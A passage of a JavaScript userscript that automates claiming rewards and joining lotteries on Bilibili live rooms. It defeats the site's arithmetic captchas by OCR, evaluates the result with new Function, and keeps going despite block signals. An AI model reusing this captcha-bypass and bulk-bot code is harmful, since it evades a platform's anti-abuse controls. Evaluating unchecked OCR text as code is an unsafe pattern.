		if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
		const p = $.Deferred();
		runUntilSucceed(() => {
		    try {
			if ($('.draw-box.gift-left-part').length) {
			    window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
			    p.resolve();
			    return true;
			}
			let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
			if (!treasure_box.length) return false;
			treasure_box = treasure_box.first();
			treasure_box.attr('id', 'old_treasure_box');
			treasure_box.hide();
			const div = $(
			    `<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`
			);
			TreasureBox.DOM.div_tip = $(
			    `<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`
			);
			TreasureBox.DOM.div_timer = $(
			    `<div id="${NAME}_treasure_div_timer" class="t-center b-box none-select">0</div>`
			);
			TreasureBox.DOM.image = $(
			    `<img id="${NAME}_treasure_image" style="display:none">`);
			TreasureBox.DOM.canvas = $(
			    `<canvas id="${NAME}_treasure_canvas" style="display:none" height="40" width="120"></canvas>`
			);
			const css_text =
			      'min-width: 40px;padding: 2px 3px;margin-top: 3px;font-size: 12px;color: #fff;background-color: rgba(0,0,0,.5);border-radius: 10px;';
			TreasureBox.DOM.div_tip[0].style = css_text;
			TreasureBox.DOM.div_timer[0].style = css_text;
			div.append(TreasureBox.DOM.div_tip);
			div.append(TreasureBox.DOM.image);
			div.append(TreasureBox.DOM.canvas);
			TreasureBox.DOM.div_tip.after(TreasureBox.DOM.div_timer);
			treasure_box.after(div);
			if (!Info.mobile_verify) {
			    TreasureBox.setMsg('未绑定<br>手机');
			    window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
			    p.resolve();
			    return true;
			}
			try {
			    if (OCRAD);
			} catch (err) {
			    TreasureBox.setMsg('初始化<br>失败');
			    window.toast('[自动领取瓜子]OCRAD初始化失败，请检查网络', 'error');
			    console.error(`[${NAME}]`, err);
			    p.resolve();
			    return true;
			}
			TreasureBox.timer = setInterval(() => {
			    let t = parseInt(TreasureBox.DOM.div_timer.text(), 10);
			    if (isNaN(t)) t = 0;
			    if (t > 0) TreasureBox.DOM.div_timer.text(`${t - 1}s`);
			    else TreasureBox.DOM.div_timer.hide();
			}, 1e3);
			TreasureBox.DOM.image[0].onload = () => {
			    // 实现功能类似 https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js 中Live.treasure.init()的验证码处理部分
			    const ctx = TreasureBox.DOM.canvas[0].getContext('2d');
			    ctx.font = '40px agencyfbbold';
			    ctx.textBaseline = 'top';
			    ctx.clearRect(0, 0, TreasureBox.DOM.canvas[0].width, TreasureBox.DOM
					  .canvas[0].height);
			    ctx.drawImage(TreasureBox.DOM.image[0], 0, 0);
			    const grayscaleMap = TreasureBox.captcha.OCR.getGrayscaleMap(ctx);
			    const filterMap = TreasureBox.captcha.OCR.orderFilter2In3x3(
				grayscaleMap);
			    ctx.clearRect(0, 0, 120, 40);
			    for (let i = 0; i < filterMap.length; ++i) {
				const gray = filterMap[i];
				ctx.fillStyle = `rgb(${gray}, ${gray}, ${gray})`;
				ctx.fillRect(i % 120, Math.round(i / 120), 1, 1);
			    }
			    try {
				const question = TreasureBox.captcha.correctQuestion(OCRAD(ctx.getImageData(
				    0, 0, 120, 40)));
				DEBUG('TreasureBox.DOM.image.load', 'question =', question);
				const answer = TreasureBox.captcha.eval(question);
				DEBUG('TreasureBox.DOM.image.load', 'answer =', answer);
				if (answer !== undefined) {
				    // window.toast(`[自动领取瓜子]验证码识别结果: ${question} = ${answer}`, 'info');
				    console.info(
					`[${NAME}][自动领取瓜子]验证码识别结果: ${question} = ${answer}`
				    );
				    TreasureBox.promise.calc.resolve(answer);
				}
			    } catch (err) {
				TreasureBox.promise.calc.reject();
			    }
			};
			p.resolve();
			return true;
		    } catch (err) {
			window.toast('[自动领取瓜子]初始化时出现异常，已停止', 'error');
			console.error(`[${NAME}]`, err);
			p.reject();
			return true;
		    }
		});
		return p;
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_TREASUREBOX || !TreasureBox.timer) return;
		    if (Info.awardBlocked) {
			TreasureBox.setMsg('瓜子小黑屋');
			window.toast('[自动领取瓜子]帐号被关小黑屋，停止领取瓜子', 'caution');
			return;
		    }
		    if (CACHE.treasure_box_ts && !checkNewDay(CACHE.treasure_box_ts)) {
			TreasureBox.setMsg('今日<br>已领完');
			runTomorrow(TreasureBox.run);
			return;
		    }
		    TreasureBox.getCurrentTask().then((response) => {
			DEBUG('TreasureBox.run: TreasureBox.getCurrentTask().then', response);
			if (response.code === 0) {
			    // 获取任务成功
			    TreasureBox.promise.timer = $.Deferred();
			    TreasureBox.promise.timer.then(() => {
				TreasureBox.captcha.calc().then((captcha) => {
				    // 验证码识别完成
				    TreasureBox.getAward(captcha).then(() =>
								       TreasureBox.run(), () => TreasureBox.run()
								      );
				}, () => TreasureBox.run());
			    });
			    TreasureBox.time_end = response.data.time_end;
			    TreasureBox.time_start = response.data.time_start;
			    let t = TreasureBox.time_end - ts_s() + 1;
			    if (t < 0) t = 0;
			    setTimeout(() => {
				if (TreasureBox.promise.timer) TreasureBox.promise.timer.resolve();
			    }, t * 1e3);
			    TreasureBox.DOM.div_timer.text(`${t}s`);
			    TreasureBox.DOM.div_timer.show();
			    TreasureBox.DOM.div_tip.html(
				`次数<br>${response.data.times}/${response.data.max_times}<br>银瓜子<br>${response.data.silver}`
			    );
			} else if (response.code === -10017) {
			    // 今天所有的宝箱已经领完!
			    TreasureBox.setMsg('今日<br>已领完');
			    // window.toast(`[自动领取瓜子]${response.msg}`, 'info');
			    CACHE.treasure_box_ts = ts_ms();
			    Essential.Cache.save();
			    runTomorrow(TreasureBox.run);
			} else if (response.code === -500) {
			    // 请先登录!
			    location.reload();
			} else {
			    window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
			    return TreasureBox.run();
			}
		    });
		} catch (err) {
		    TreasureBox.setMsg('运行<br>异常');
		    window.toast('[自动领取瓜子]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    },
	    setMsg: (htmltext) => {
		if (!CONFIG.AUTO_TREASUREBOX) return;
		if (TreasureBox.promise.timer) {
		    TreasureBox.promise.timer.reject();
		    TreasureBox.promise.timer = undefined;
		}
		if (TreasureBox.DOM.div_timer) TreasureBox.DOM.div_timer.hide();
		if (TreasureBox.DOM.div_tip) TreasureBox.DOM.div_tip.html(htmltext);
	    },
	    getAward: (captcha, cnt = 0) => {
		if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
		if (cnt > 3) return $.Deferred().resolve(); // 3次时间未到，重新运行任务
		return API.TreasureBox.getAward(TreasureBox.time_start, TreasureBox.time_end, captcha).then(
		    (response) => {
			DEBUG('TreasureBox.getAward: getAward', response);
			switch (response.code) {
			    case 0:
				window.toast(`[自动领取瓜子]领取了 ${response.data.awardSilver} 银瓜子`, 'success');
			    case -903: // -903: 已经领取过这个宝箱
				// window.toast('[自动领取瓜子]已经领取过这个宝箱', 'caution');
				return $.Deferred().resolve();
			    case -902: // -902: 验证码错误
			    case -901: // -901: 验证码过期
				return TreasureBox.captcha.calc().then((captcha) => {
				    return TreasureBox.getAward(captcha, cnt);
				});
			    case -800: // -800：未绑定手机
				TreasureBox.setMsg('未绑定<br>手机');
				window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
				return $.Deferred().reject();
			    case -500: // -500：领取时间未到, 请稍后再试
				{
				    const p = $.Deferred();
				    setTimeout(() => {
					TreasureBox.captcha.calc().then((captcha) => {
					    TreasureBox.getAward(captcha, cnt + 1).then(() =>
											p.resolve(), () => p.reject());
					}, () => p.reject());
				    }, 3e3);
				    return p;
				}
			    case 400: // 400: 访问被拒绝
				if (response.msg.indexOf('拒绝') > -1) {
				    Info.awardBlocked = true;
				    Essential.DataSync.down();
				    TreasureBox.setMsg('拒绝<br>访问');
				    window.toast('[自动领取瓜子]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
				    return $.Deferred().reject();
				}
				window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
				return $.Deferred().resolve();
			    default: // 其他错误
				window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
			}
		    }, () => {
			window.toast('[自动领取瓜子]获取任务失败，请检查网络', 'error');
			return delayCall(() => TreasureBox.getAward(captcha, cnt));
		    });
	    },
	    getCurrentTask: () => {
		if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
		return API.TreasureBox.getCurrentTask().then((response) => {
		    DEBUG('TreasureBox.getCurrentTask: API.TreasureBox.getCurrentTask', response);
		    return $.Deferred().resolve(response);
		}, () => {
		    window.toast('[自动领取瓜子]获取当前任务失败，请检查网络', 'error');
		    return delayCall(() => TreasureBox.getCurrentTask());
		});
	    },
	    captcha: {
		cnt: 0,
		calc: () => {
		    if (!CONFIG.AUTO_TREASUREBOX) {
			TreasureBox.captcha.cnt = 0;
			return $.Deferred().reject();
		    }
		    if (TreasureBox.captcha.cnt > 100) { // 允许验证码无法识别的次数
			// 验证码识别失败
			TreasureBox.setMsg('验证码<br>识别<br>失败');
			window.toast('[自动领取瓜子]验证码识别失败，已停止', 'error');
			return $.Deferred().reject();
		    }
		    return API.TreasureBox.getCaptcha(ts_ms()).then((response) => {
			DEBUG('TreasureBox.captcha.calc: getCaptcha', response);
			if (response.code === 0) {
			    TreasureBox.captcha.cnt++;
			    const p = $.Deferred();
			    TreasureBox.promise.calc = $.Deferred();
			    TreasureBox.promise.calc.then((captcha) => {
				TreasureBox.captcha.cnt = 0;
				p.resolve(captcha);
			    }, () => {
				TreasureBox.captcha.calc().then((captcha) => {
				    p.resolve(captcha);
				}, () => {
				    p.reject();
				});
			    });
			    TreasureBox.DOM.image.attr('src', response.data.img);
			    return p;
			} else {
			    window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
			    return delayCall(() => TreasureBox.captcha.calc());
			}
		    }, () => {
			window.toast('[自动领取瓜子]加载验证码失败，请检查网络', 'error');
			return delayCall(() => TreasureBox.captcha.calc());
		    });
		},
		// 对B站验证码进行处理
		// 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
		// 删除了未使用的变量
		OCR: {
		    getGrayscaleMap: (context, rate = 235, width = 120, height = 40) => {
			function getGrayscale(x, y) {
			    const pixel = context.getImageData(x, y, 1, 1).data;
			    return pixel ? (77 * pixel[0] + 150 * pixel[1] + 29 * pixel[2] + 128) >> 8 : 0;
			}
			const map = [];
			for (let y = 0; y < height; y++) { // line y
			    for (let x = 0; x < width; x++) { // column x
				const gray = getGrayscale(x, y);
				map.push(gray > rate ? gray : 0);
			    }
			}
			return map;
		    },
		    orderFilter2In3x3: (grayscaleMap, n = 9, width = 120) => {
			const gray = (x, y) => (x + y * width >= 0) ? grayscaleMap[x + y * width] : 255;
			const map = [];
			const length = grayscaleMap.length;
			const catchNumber = n - 1;
			for (let i = 0; i < length; ++i) {
			    const [x, y] = [i % width, Math.floor(i / width)];
			    const matrix = new Array(9);
			    matrix[0] = gray(x - 1, y - 1);
			    matrix[1] = gray(x + 0, y - 1);
			    matrix[2] = gray(x + 1, y - 1);
			    matrix[3] = gray(x - 1, y + 0);
			    matrix[4] = gray(x + 0, y + 0);
			    matrix[5] = gray(x + 1, y + 0);
			    matrix[6] = gray(x - 1, y + 1);
			    matrix[7] = gray(x + 0, y + 1);
			    matrix[8] = gray(x + 1, y + 1);
			    matrix.sort((a, b) => a - b);
			    map.push(matrix[catchNumber]);
			}
			return map;
		    },
		    execMap: (connectMap, rate = 4) => {
			const map = [];
			const connectMapLength = connectMap.length;
			for (let i = 0; i < connectMapLength; ++i) {
			    let blackPoint = 0;
			    // const [x, y] = [i % 120, Math.round(i / 120)];
			    const top = connectMap[i - 120];
			    const topLeft = connectMap[i - 120 - 1];
			    const topRight = connectMap[i - 120 + 1];
			    const left = connectMap[i - 1];
			    const right = connectMap[i + 1];
			    const bottom = connectMap[i + 120];
			    const bottomLeft = connectMap[i + 120 - 1];
			    const bottomRight = connectMap[i + 120 + 1];
			    if (top) blackPoint += 1;
			    if (topLeft) blackPoint += 1;
			    if (topRight) blackPoint += 1;
			    if (left) blackPoint += 1;
			    if (right) blackPoint += 1;
			    if (bottom) blackPoint += 1;
			    if (bottomLeft) blackPoint += 1;
			    if (bottomRight) blackPoint += 1;
			    if (blackPoint > rate) map.push(1);
			    else map.push(0);
			}
			return map;
		    }
		},
		eval: (fn) => {
		    let Fn = Function;
		    return new Fn(`return ${fn}`)();
		},
		// 修正OCRAD识别结果
		// 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
		// 修改部分：
		// 1.将correctStr声明在correctQuestion函数内部，并修改相关引用
		// 2.在correctStr中增加'>': 3
		correctStr: {
		    'g': 9,
		    'z': 2,
		    'Z': 2,
		    'o': 0,
		    'l': 1,
		    'B': 8,
		    'O': 0,
		    'S': 6,
		    's': 6,
		    'i': 1,
		    'I': 1,
		    '.': '-',
		    '_': 4,
		    'b': 6,
		    'R': 8,
		    '|': 1,
		    'D': 0,
		    '>': 3
		},
		correctQuestion: (question) => {
		    let q = '';
		    question = question.trim();
		    for (let i in question) {
			let a = TreasureBox.captcha.correctStr[question[i]];
			q += (a !== undefined ? a : question[i]);
		    }
		    if (q[2] === '4') q[2] = '+';
		    return q;
		}
	    }
	}; // Constantly Run, Need Init

	const Lottery = {
	    hasWS: false,
	    createCount: 0,
	    roomidSet: new Set(),
	    listenSet: new Set(),
	    Gift: {
		_join: (roomid, raffleId, type, time_wait = 0) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    raffleId = parseInt(raffleId, 10);
		    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
		    return delayCall(() => API.Lottery.Gift.join(roomid, raffleId, type).then((response) => {
			DEBUG('Lottery.Gift._join: API.Lottery.Gift.join', response);
			switch (response.code) {
			    case 0:
				window.toast(
				    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type})`,
				    'success');
				break;
			    case 402:
				// 抽奖已过期，下次再来吧
				break;
			    case 65531:
				// 65531: 非当前直播间或短ID直播间试图参加抽奖
				//Info.blocked = true;
				Essential.DataSync.down();
				window.toast(
				    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`,
				    'error');
				break;
			    default:
				if (response.msg.indexOf('拒绝') > -1) {
				    //Info.blocked = true;
				    //Essential.DataSync.down();
				    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
				} else if (response.msg.indexOf('快') > -1) {
				    return delayCall(() => Lottery.Gift._join(roomid, raffleId));
				} else {
				    window.toast(
					`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
					'caution');
				}
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.Gift._join(roomid, raffleId));
		    }), time_wait * 1e3 + 5e3);
		}
	    },
	    Guard: {
		wsList: [],
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    return API.Lottery.Guard.join(roomid, id).then((response) => {
			DEBUG('Lottery.Guard._join: API.Lottery.Guard.join', response);
			if (response.code === 0) {
			    window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功`, 'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //Essential.DataSync.down();
			    //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (response.msg.indexOf('快') > -1) {
			    return delayCall(() => Lottery.Guard._join(roomid, id));
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
					 'caution');
			}
		    }, () => {
			window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
			return delayCall(() => Lottery.Guard._join(roomid, id));
		    });
		}
	    },
	    MaterialObject: {
		list: [],
		ignore_keyword: ['test', 'encrypt', '测试', '钓鱼', '加密', '炸鱼'],
		run: () => {
		    try {
			if (CACHE.materialobject_ts) {
			    const diff = ts_ms() - CACHE.materialobject_ts;
			    const interval = CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL *
				  60e3 || 600e3;
			    if (diff < interval) {
				setTimeout(Lottery.MaterialObject.run, interval - diff);
				return $.Deferred().resolve();
			    }
			}
			return Lottery.MaterialObject.check().then((aid) => {
			    if (aid) { // aid有效
				CACHE.last_aid = aid;
				CACHE.materialobject_ts = ts_ms();
				Essential.Cache.save();
			    }
			    setTimeout(Lottery.MaterialObject.run, CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG
				       .CHECK_INTERVAL * 60e3 || 600e3);
			}, () => delayCall(() => Lottery.MaterialObject.run()));
		    } catch (err) {
			window.toast('[自动抽奖][实物抽奖]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		},
		check: (aid, valid = 564, rem = 9) => { // TODO
		    aid = parseInt(aid || (CACHE.last_aid), 10);
		    if (isNaN(aid)) aid = valid;
		    DEBUG('Lottery.MaterialObject.check: aid=', aid);
		    return API.Lottery.MaterialObject.getStatus(aid).then((response) => {
			DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.getStatus',
			      response);
			if (response.code === 0 && response.data) {
			    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.IGNORE_QUESTIONABLE_LOTTERY &&
				Lottery.MaterialObject.ignore_keyword.some(v => response.data.title
									   .toLowerCase().indexOf(v) > -1)) {
				window.toast(`[自动抽奖][实物抽奖]忽略抽奖(aid=${aid})`, 'info');
				return Lottery.MaterialObject.check(aid + 1, aid);
			    } else {
				return Lottery.MaterialObject.join(aid, response.data.title,
								   response.data.typeB).then(() => Lottery.MaterialObject.check(
				    aid + 1, aid));
			    }
			} else if (response.code === -400 || response.data == null) { // 活动不存在
			    if (rem) return Lottery.MaterialObject.check(aid + 1, valid, rem - 1);
			    return $.Deferred().resolve(valid);
			} else {
			    window.toast(`[自动抽奖][实物抽奖]${response.msg}`, 'info');
			}
		    }, () => {
			window.toast(`[自动抽奖][实物抽奖]检查抽奖(aid=${aid})失败，请检查网络`, 'error');
			return delayCall(() => Lottery.MaterialObject.check(aid, valid));
		    });
		},
		join: (aid, title, typeB, i = 0) => {
		    if (i >= typeB.length) return $.Deferred().resolve();
		    if (Lottery.MaterialObject.list.some(v => v.aid === aid && v.number === i + 1)) return Lottery
			.MaterialObject.join(aid, title, typeB, i + 1);
		    const number = i + 1;
		    const obj = {
			title: title,
			aid: aid,
			number: number,
			status: typeB[i].status,
			join_start_time: typeB[i].join_start_time,
			join_end_time: typeB[i].join_end_time
		    };
		    switch (obj.status) {
			case -1: // 未开始
			    {
				Lottery.MaterialObject.list.push(obj);
				const p = $.Deferred();
				p.then(() => {
				    return Lottery.MaterialObject.draw(obj);
				});
				setTimeout(() => {
				    p.resolve();
				}, (obj.join_start_time - ts_s() + 1) * 1e3);
			    }
			    break;
			case 0: // 可参加
			    return Lottery.MaterialObject.draw(obj).then(() => {
				return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
			    });
			case 1: // 已参加
			    {
				Lottery.MaterialObject.list.push(obj);
				const p = $.Deferred();
				p.then(() => {
				    return Lottery.MaterialObject.notice(obj);
				});
				setTimeout(() => {
				    p.resolve();
				}, (obj.join_end_time - ts_s() + 1) * 1e3);
			    }
			    break;
		    }
		    return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
		},
		draw: (obj) => {
		    return API.Lottery.MaterialObject.draw(obj.aid, obj.number).then((response) => {
			DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.draw',
			      response);
			if (response.code === 0) {
			    $.each(Lottery.MaterialObject.list, (i, v) => {
				if (v.aid === obj.aid && v.number === obj.number) {
				    v.status = 1;
				    Lottery.MaterialObject.list[i] = v;
				    return false;
				}
			    });
			    const p = $.Deferred();
			    p.then(() => {
				return Lottery.MaterialObject.notice(obj);
			    });
			    setTimeout(() => {
				p.resolve();
			    }, (obj.join_end_time - ts_s() + 1) * 1e3);
			} else {
			    window.toast(
				`[自动抽奖][实物抽奖]"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
				'caution');
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][实物抽奖]参加"${obj.title}"(aid=${obj.aid},number=${obj.number})失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.MaterialObject.draw(obj));
		    });
		},
		notice: (obj) => {
		    return API.Lottery.MaterialObject.getWinnerGroupInfo(obj.aid, obj.number).then((
			response) => {
			DEBUG(
			    'Lottery.MaterialObject.check: API.Lottery.MaterialObject.getWinnerGroupInfo',
			    response);
			if (response.code === 0) {
			    $.each(Lottery.MaterialObject.list, (i, v) => {
				if (v.aid === obj.aid && v.number === obj.number) {
				    v.status = 3;
				    Lottery.MaterialObject.list[i] = v;
				    return false;
				}
			    });
			    $.each(response.data.winnerList, (i, v) => {
				if (v.uid === Info.uid) {
				    window.toast(
					`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})获得奖励"${v.giftTitle}"`,
					'info');
				    return false;
				}
			    });
			} else {
			    window.toast(
				`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
				'caution');
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][实物抽奖]获取抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})中奖名单失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.MaterialObject.notice(obj));
		    });
		}
	    },
	    create: (roomid, real_roomid, type, link_url) => {
		if (Lottery.createCount > 99) location.reload();
		if (!real_roomid) real_roomid = roomid;
		if (Info.roomid === real_roomid) return;
		// roomid过滤，防止创建多个同样roomid的iframe
		if (Lottery.roomidSet.has(real_roomid)) return;
		Lottery.roomidSet.add(real_roomid);
		const iframe = $('<iframe style="display: none;"></iframe>')[0];
		iframe.name = real_roomid;
		let url;
		if (link_url) url = `${link_url.replace('https:', '').replace('http:', '')}` + (Info.visit_id ?
												`&visit_id=${Info.visit_id}` : '');
		else url = `//live.bilibili.com/${roomid}` + (Info.visit_id ? `?visit_id=${Info.visit_id}` :
							      '');
		iframe.src = url;
		document.body.appendChild(iframe);
		const pFinish = $.Deferred();
		pFinish.then(() => {
		    window[NAME].iframeSet.delete(iframe);
		    $(iframe).remove();
		    Lottery.roomidSet.delete(real_roomid);
		});
		const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
		const pInit = $.Deferred();
		pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
		const up = () => {
		    CACHE = window[NAME].CACHE;
		    Info = window[NAME].Info;
		    Essential.Cache.save();
		    const pUp = $.Deferred();
		    pUp.then(up);
		    iframe[NAME].promise.up = pUp;
		};
		const pUp = $.Deferred();
		pUp.then(up);
		iframe[NAME] = {
		    roomid: real_roomid,
		    type: type,
		    promise: {
			init: pInit, // 这个Promise在子脚本加载完成时resolve
			finish: pFinish, // 这个Promise在iframe需要删除时resolve
			down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
			up: pUp
		    }
		};
		window[NAME].iframeSet.add(iframe);
		++Lottery.createCount;
		DEBUG('Lottery.create: iframe', iframe);
	    },
	    listen: (uid, roomid, area = '', gift = false, volatile = true) => {
		if (Lottery.listenSet.has(roomid)) return;
		Lottery.listenSet.add(roomid);
		return API.room.getConf(roomid).then((response) => {
		    DEBUG('Lottery.listen: API.room.getConf', response);
		    //if (Info.blocked) return;
		    let ws = new API.DanmuWebSocket(uid, roomid, response.data.host_server_list,
						    response.data.token);
		    let id = 0;
		    if (volatile) id = Lottery.Guard.wsList.push(ws);
		    ws.bind((newws) => {
			if (volatile && id) Lottery.Guard.wsList[id - 1] = newws;
			window.toast(`[自动抽奖]${area}(${roomid})弹幕服务器连接断开，尝试重连`, 'caution');
		    }, () => {
			window.toast(`[自动抽奖]${area}(${roomid})连接弹幕服务器成功`, 'success');
			//if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY || CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) Lottery.create(roomid, roomid, 'LOTTERY');
		    }, (num) => {
			//console.log(`房间${roomid}，人气值：${num}`);
			//if (Info.blocked) {
			//    ws.close();
			//    window.toast(`[自动抽奖]${area}(${roomid})主动与弹幕服务器断开连接`, 'info');
			//}
		    }, (obj, str) => {
			switch (obj.cmd) {
			    case 'DANMU_MSG':
			    case 'SEND_GIFT':
			    case 'ENTRY_EFFECT':
			    case 'WELCOME':
			    case 'WELCOME_GUARD':
			    case 'COMBO_SEND':
			    case 'COMBO_END':
			    case 'WISH_BOTTLE':
			    case 'ROOM_RANK':
			    case 'ROOM_REAL_TIME_MESSAGE_UPDATE':
				break;
			    case 'NOTICE_MSG':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				switch (obj.msg_type) {
				    case 1:
					// 系统
					break;
				    case 2:
				    case 8:
					// 礼物抽奖
					if (!CONFIG.AUTO_LOTTERY) break;
					if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Gift.run(obj.real_roomid);
					break;
				    case 3:
					// 舰队领奖
					if (!CONFIG.AUTO_LOTTERY) break;
					if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Guard.run(obj.real_roomid);
					break;
				    case 4:
					// 登船
					break;
				    case 5:
					// 获奖
					break;
				    case 6:
					// 节奏风暴
					if (!CONFIG.AUTO_LOTTERY) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Storm.run(roomid);
					break;
				}
				break;
			    case 'GUARD_LOTTERY_START':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
				//if (Info.blocked || !obj.data.roomid || !obj.data.lottery.id) break;
				if (obj.data.roomid === Info.roomid) {
				    Lottery.Guard._join(Info.roomid, obj.data.lottery.id);
				} else {
				    BiliPushUtils.Guard.run(obj.data.roomid);
				}
				break;
			    case 'RAFFLE_START':
			    case 'TV_START':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
				//if (Info.blocked || !obj.data.msg.roomid || !obj.data.msg.real_roomid || !obj.data.raffleId) break;
				if (obj.data.msg.real_roomid === Info.roomid) {
				    Lottery.Gift._join(Info.roomid, obj.data.raffleId, obj.data
						       .type, obj.data.time_wait);
				} else {
				    BiliPushUtils.Gift.run(obj.data.msg.real_roomid);
				}
				break;
			    case 'SPECIAL_GIFT':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (obj.data['39']) {
				    switch (obj.data['39'].action) {
					case 'start':
					    // 节奏风暴开始
					    BiliPushUtils.Storm.run(roomid);
					case 'end':
					    // 节奏风暴结束
				    }
				};
				break;
			    default:
				if (gift) DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				break;
			}
		    });
		}, () => delayCall(() => Lottery.listen(uid, roomid, area, volatile)));
	    },
	    listenAll: () => {
		//if (Info.blocked) return;
		if (!Lottery.hasWS) {
		    Lottery.listen(Info.uid, Info.roomid, '', true, false);
		    Lottery.hasWS = true;
		}
		Lottery.Guard.wsList.forEach(v => v.close());
		Lottery.Guard.wsList = [];
		Lottery.listenSet = new Set();
		Lottery.listenSet.add(Info.roomid);
		const fn1 = () => {
		    return API.room.getList().then((response) => {
			DEBUG('Lottery.listenAll: API.room.getList', response);
			for (const obj of response.data) {
			    fn2(obj);
			}
		    }, () => delayCall(() => fn1()));
		};
		const fn2 = (obj) => {
		    return API.room.getRoomList(obj.id, 0, 0, 1, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD ?
						CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER : 1).then((
			response) => {
			DEBUG('Lottery.listenAll: API.room.getRoomList', response);
			for (let j = 0; j < response.data.length; ++j) {
			    Lottery.listen(Info.uid, response.data[j].roomid, `[${obj.name}区]`,
					   !j, true);
			}
		    }, () => delayCall(() => fn2(obj)));
		};
		fn1();
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_LOTTERY) return;
		    if (Info.blocked) {
			//window.toast('[自动抽奖]帐号被关小黑屋，停止自动抽奖', 'caution');
			//return;
		    }
		    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY) Lottery.MaterialObject.run();
